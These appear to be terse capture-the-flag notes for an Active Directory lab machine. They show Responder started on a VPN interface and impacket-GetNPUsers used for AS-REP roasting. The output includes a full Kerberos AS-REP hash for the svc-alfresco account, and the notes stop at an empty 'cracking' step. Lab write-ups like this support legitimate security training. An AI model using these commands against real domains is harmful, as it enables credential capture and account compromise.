- Start responder 
```
sudo responder -I tun0
```
- Create wordlist from usernames 
- check for no preauth users with get npusers from impacket
```
impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.domain.txt
```
- Output
```
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f1d92e8069100d3211632fa206366492$8fce52fb998ae5b9355991e862ea90534d371d025b36ad742360b7fff69d9105463067b15841c06058ef41986c87338ffd20397f441dbaa1fdb8d9e24a18bd9339fe35d9b33de372022a00a6590cdc597278af5f362cf1d0d70397e95a1c323542211329a5b4f1f1014cff3748a65d739b4c39ce47472524b3bab650437a7621dbbca97e851196669fa29368c6815db3c447cff039cdd24900fbc61cfb433b626285940e81763b296789ad0cf4bd357f80714d0970f970cc084d195f9c3ece012e15884b8ee235ed130d701247fc60d26bd9781b3a0ab981a17566dc05628a77381860bf9468
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- Cracking svc-alfresco with mimikatz
```

```